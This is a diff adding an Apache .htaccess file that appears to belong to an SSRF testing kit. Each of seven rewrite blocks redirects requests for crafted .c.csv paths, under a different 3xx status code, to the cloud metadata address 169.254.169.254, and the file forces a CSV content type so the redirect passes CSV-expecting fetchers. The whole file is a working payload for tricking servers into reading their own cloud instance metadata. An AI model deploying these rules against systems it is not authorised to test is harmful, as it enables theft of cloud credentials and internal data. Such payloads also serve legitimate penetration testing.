@@ -1,0 +1,60 @@
+# Set csv response body
+ErrorDocument 300 "Device Name,Platform,OS"
+ErrorDocument 301 "Device Name,Platform,OS"
+ErrorDocument 302 "Device Name,Platform,OS"
+ErrorDocument 303 "Device Name,Platform,OS"
+ErrorDocument 305 "Device Name,Platform,OS"
+ErrorDocument 307 "Device Name,Platform,OS"
+ErrorDocument 308 "Device Name,Platform,OS"
+
+# 300 with response body
+# https://ssrf.localdomain.pw/csv-with-body-md/300-http-.c.csv
+# https://ssrf.localdomain.pw/csv-with-body-md/300-http-test/.c.csv
+RewriteEngine on
+RewriteCond %{REQUEST_URI} 300-([^/-]*)-(.*).c.csv$
+RewriteRule 300-([^/-]*)-(.*).c.csv$ $1://169.254.169.254/$2 [L,R=300,NC]
+
+# 301 with response body
+# https://ssrf.localdomain.pw/csv-with-body-md/301-http-.c.csv
+# https://ssrf.localdomain.pw/csv-with-body-md/301-http-test/.c.csv
+RewriteEngine on
+RewriteCond %{REQUEST_URI} 301-([^/-]*)-(.*).c.csv$
+RewriteRule 301-([^/-]*)-(.*).c.csv$ $1://169.254.169.254/$2 [L,R=301,NC]
+
+# 302 with response body
+# https://ssrf.localdomain.pw/csv-with-body-md/302-http-.c.csv
+# https://ssrf.localdomain.pw/csv-with-body-md/302-http-test/.c.csv
+RewriteEngine on
+RewriteCond %{REQUEST_URI} 302-([^/-]*)-(.*).c.csv$
+RewriteRule 302-([^/-]*)-(.*).c.csv$ $1://169.254.169.254/$2 [L,R=302,NC]
+
+# 303 with response body
+# https://ssrf.localdomain.pw/csv-with-body-md/303-http-.c.csv
+# https://ssrf.localdomain.pw/csv-with-body-md/303-http-test/.c.csv
+RewriteEngine on
+RewriteCond %{REQUEST_URI} 303-([^/-]*)-(.*).c.csv$
+RewriteRule 303-([^/-]*)-(.*).c.csv$ $1://169.254.169.254/$2 [L,R=303,NC]
+
+# 305 with response body
+# https://ssrf.localdomain.pw/csv-with-body-md/305-http-.c.csv
+# https://ssrf.localdomain.pw/csv-with-body-md/305-http-test/.c.csv
+RewriteEngine on
+RewriteCond %{REQUEST_URI} 305-([^/-]*)-(.*).c.csv$
+RewriteRule 305-([^/-]*)-(.*).c.csv$ $1://169.254.169.254/$2 [L,R=305,NC]
+
+# 307 with response body
+# https://ssrf.localdomain.pw/csv-with-body-md/307-http-.c.csv
+# https://ssrf.localdomain.pw/csv-with-body-md/307-http-test/.c.csv
+RewriteEngine on
+RewriteCond %{REQUEST_URI} 307-([^/-]*)-(.*).c.csv$
+RewriteRule 307-([^/-]*)-(.*).c.csv$ $1://169.254.169.254/$2 [L,R=307,NC]
+
+# 308 with response body
+# https://ssrf.localdomain.pw/csv-with-body-md/308-http-.c.csv
+# https://ssrf.localdomain.pw/csv-with-body-md/308-http-test/.c.csv
+RewriteEngine on
+RewriteCond %{REQUEST_URI} 308-([^/-]*)-(.*).c.csv$
+RewriteRule 308-([^/-]*)-(.*).c.csv$ $1://169.254.169.254/$2 [L,R=308,NC]
+
+# Always set the Content-Type header text/csv
+Header always set Content-Type text/csv
